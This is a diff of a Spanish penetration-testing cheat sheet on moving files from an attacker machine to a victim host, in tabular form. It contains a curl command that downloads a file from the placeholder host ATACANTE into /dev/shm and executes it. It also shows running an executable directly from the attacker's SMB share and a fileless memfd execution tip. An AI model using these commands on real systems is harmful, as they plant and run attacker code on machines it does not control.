@@ -16,7 +16,6 @@ tags:
 `ATACANTE` es tu IP; `OBJETIVO` la víctima; `ARCHIVO` el archivo a transferir.
 
 ## Servir el archivo desde el box del atacante
-
 Cuando el objetivo no tiene internet pero te alcanza a vos.
 
 | Servidor | Comando |
@@ -43,6 +42,7 @@ SMB con credenciales fuerza SMBv3 y evita el modo abierto.
 | Copiar desde SMB del atacante | `copy \\ATACANTE\share\ARCHIVO.exe C:\Temp\ARCHIVO.exe` |
 | Ejecutar desde SMB directo | `\\ATACANTE\share\ARCHIVO.exe` |
 
+
 ## Linux — traer
 
 | Método | Comando |
@@ -57,8 +57,8 @@ SMB con credenciales fuerza SMBv3 y evita el modo abierto.
 | **Fileless**: ELF por memfd | `fileless-elf-exec` (crea `memfd_create` y ejecuta sin tocar disco) |
 | Semi-fileless: a RAM (tmpfs) | `curl http://ATACANTE/ARCHIVO -o /dev/shm/ARCHIVO && chmod +x /dev/shm/ARCHIVO && /dev/shm/ARCHIVO` |
 
-## Sin ninguna utilidad de red — base64 por copiar y pegar
 
+## Sin ninguna utilidad de red — base64 por copiar y pegar
 Cuando solo hay una consola (shell restringida, sin salida de red).
 
 | Paso | Comando |
@@ -67,15 +67,16 @@ Cuando solo hay una consola (shell restringida, sin salida de red).
 | Decodificar (objetivo Linux) | `echo 'BASE64' \| base64 -d > /tmp/ARCHIVO` |
 | Decodificar (objetivo Windows) | `certutil -decode ARCHIVO.b64 ARCHIVO.exe` |
 
-## Verificar que llegó entero
 
+## Verificar que llegó entero
 Comparar el hash a ambos lados antes de ejecutar.
 
-| Sistema | Comando |
-|---|---|
-| Linux | `sha256sum ARCHIVO` |
-| Windows (PowerShell) | `Get-FileHash ARCHIVO.exe -Algorithm SHA256` |
-| Windows (sin PowerShell) | `certutil -hashfile ARCHIVO.exe SHA256` |
+| Sistema | SHA256 | MD5 |
+|---|---|---|
+| Linux | `sha256sum ARCHIVO` | `md5sum ARCHIVO` |
+| Windows (PowerShell) | `Get-FileHash ARCHIVO.exe -Algorithm SHA256` | `Get-FileHash ARCHIVO.exe -Algorithm MD5` |
+| Windows (sin PowerShell) | `certutil -hashfile ARCHIVO.exe SHA256` | `certutil -hashfile ARCHIVO.exe MD5` |
+
 
 ## Errores frecuentes
 
@@ -85,3 +86,4 @@ Comparar el hash a ambos lados antes de ejecutar.
 | binario "corrupto" al ejecutar | transferencia en modo texto (FTP) | forzar binario, o verificar hash |
 | SMB no monta desde Win10/11 | SMBv1 deshabilitado | `-smb2support` en el server |
 | PowerShell IWR muy lento | barra de progreso | `$ProgressPreference='SilentlyContinue'` |
+
